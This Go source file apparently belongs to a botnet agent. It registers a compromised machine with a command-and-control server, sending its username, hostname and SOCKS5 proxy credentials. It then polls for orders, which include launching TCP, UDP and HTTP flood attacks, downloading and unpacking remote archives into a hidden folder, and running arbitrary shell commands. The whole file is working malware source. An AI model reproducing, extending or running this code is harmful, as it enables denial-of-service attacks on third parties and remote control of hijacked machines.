package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func sendResp(cmdid string, resp string) {
	_, err := http.PostForm(botconf.C2, url.Values{
		"cmdid":       {cmdid},
		"cmdresponse": {resp},
	})
	if err != nil {
		fmt.Println("Error sending cmd response to c2")
	}
}

func switch_command(resp *http.Response) {
	command, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading from c2: ", err.Error())
		return
	}

	fmt.Println("COMMAND: ", command)

	if len(command) < 1 {
		fmt.Println("Command is too small from c2")
		return
	}

	fmt.Println("Got command from c2: ", command)

	cmdbits := strings.Split(string(command), " ")

	if len(cmdbits) < 2 {
		return
	}

	switch cmdbits[1] {
	case "ddos-tcp":
		if len(cmdbits) < 5 {
			sendResp(cmdbits[0], "Not enough arguments")
			return
		}

		for i := 0; i < 100; i++ {
			go ddosTcp(cmdbits)
		}

		sendResp(cmdbits[0], "Ddos-TCP started")
		break

	case "ddos-udp":
		if len(cmdbits) < 5 {
			sendResp(cmdbits[0], "Not enough arguments")
			return
		}

		for i := 0; i < 100; i++ {
			go ddosUdp(cmdbits)
		}

		sendResp(cmdbits[0], "Ddos-UDP started")
		break

	case "ddos-http":
		if len(cmdbits) < 5 {
			sendResp(cmdbits[0], "Not enough arguments")
			return
		}

		for i := 0; i < 100; i++ {
			go ddosHttp(cmdbits)
		}

		sendResp(cmdbits[0], "Ddos-HTTP started")
		break

	case "hostzip":
		if len(cmdbits) < 3 {
			sendResp(cmdbits[0], "Missing zip url")
			return
		}

		downloadfile(cmdbits[2])

		fnm := strings.Split(cmdbits[2], "/")

		sourcezip := "./.static/" + fnm[len(fnm)-1]

		err := Unzip(sourcezip, "./.static/")
		if err != nil {
			sendResp(cmdbits[0], "Error unzipping "+err.Error())
		} else {
			sendResp(cmdbits[0], "Downloaded")
		}

		break

	case "deletehost":
		os.RemoveAll("./.static/")
		os.MkdirAll("./.static/", 0755)
		sendResp(cmdbits[0], "Deleted static files")
		break

	case "execute":
		if len(cmdbits) < 3 {
			sendResp(cmdbits[0], "Missing command")
		}

		cmdfull := strings.Join(cmdbits[2:], " ")
		fmt.Println("EXECUTING SYSTEM CMD: ", cmdfull)
		go execute_command(cmdbits[0], cmdfull)
		break

	default:
		sendResp(cmdbits[0], "Unrecognized command")
		break
	}
}

func contact_c2(c2 string) {
	fmt.Println("Contacting C2: ", c2)

	username := getusername()
	hostname := gethostname()
	resp, err := http.PostForm(c2, url.Values{
		"register":      {"true"},
		"username":      {username},
		"hostname":      {hostname},
		"socksuser":     {socks5_creds.username},
		"sockspassword": {socks5_creds.password},
	})
	if err != nil {
		fmt.Println("Error registering with c2")
	}

	switch_command(resp)
}

func c2_loop() {
	for {
		if botconf.C2 == "" {
			time.Sleep(1 * time.Second)
			continue
		}
		contact_c2(botconf.C2)
		if developer_mode == false {
			time.Sleep(60 * time.Second)
		} else {
			time.Sleep(1 * time.Second)
		}
	}
}

func init_c2() {
	go c2_loop()
}
